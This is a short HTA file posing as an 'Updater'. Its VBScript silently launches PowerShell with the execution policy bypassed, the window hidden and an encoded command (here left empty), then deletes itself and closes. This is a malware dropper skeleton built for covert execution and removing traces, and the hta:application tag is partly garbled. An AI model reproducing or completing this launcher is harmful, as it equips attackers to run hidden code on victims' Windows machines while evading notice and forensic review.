<!DOCTYPE html>
<html>
<head>
  <hta:application â€¦ />
  <title>Updater</title>
  <script language="VBScript">
    Dim sh: Set sh = CreateObject("WScript.Shell")
    Dim psPath, cmd
    psPath = sh.ExpandEnvironmentStrings("%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe")
    cmd    = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand "
    sh.Run Chr(34) & psPath & Chr(34) & " " & cmd, 0, False

    ' Delete self & close
    Dim htaPath, fso
    htaPath = document.location.pathname
    Set fso = CreateObject("Scripting.FileSystemObject")
    fso.DeleteFile htaPath, True
    self.close
  </script>
</head>
<body></body>
</html>
